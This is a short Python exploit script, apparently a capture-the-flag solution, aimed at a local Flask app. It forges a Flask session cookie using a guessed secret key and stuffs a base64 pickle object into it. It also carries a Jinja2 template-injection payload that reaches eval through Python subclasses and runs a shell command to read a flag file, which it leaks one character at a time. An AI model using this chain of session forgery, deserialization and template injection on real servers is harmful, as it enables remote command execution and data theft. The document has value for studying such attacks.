from flask.sessions import SecureCookieSessionInterface
import os, sys, pickle, base64, requests
from flask import render_template
import re

class Exploit(object):
    def __init__(self, pos):
        self.temp = """
        {% for c in [].__class__.__base__.__subclasses__() %}
        {% if c.__name__=='catch_warnings' %}
        {{ c.__init__.__globals__['__builtins__'].eval("ord(__import__('os').popen('cat flag').read()[pos])*'a'") }}
        {% endif %}
        {% endfor %}
        """.replace('pos', pos)

    def __reduce__(self):
        return (
            render_template, ("hi",))

class App(object):
    def __init__(self):
        self.secret_key = " "

app = App()

si = SecureCookieSessionInterface()
serializer = si.get_signing_serializer(app)

regex=r'<li><a href="/note/(\d+)">.*</a></li>'
flag=''

for i in range(0,1):
    session = serializer.dumps({'savedata': base64.b64encode(pickle.dumps(Exploit(str(i))))})

    resp = requests.get('http://127.0.0.1:5000/', cookies={
        'session': session
    })
    print(resp.text)
    find=re.findall(regex,resp.text)

    print(find)
    if find:
        flag+=chr(int(find[find.__len__()-1])+1)

print(flag)
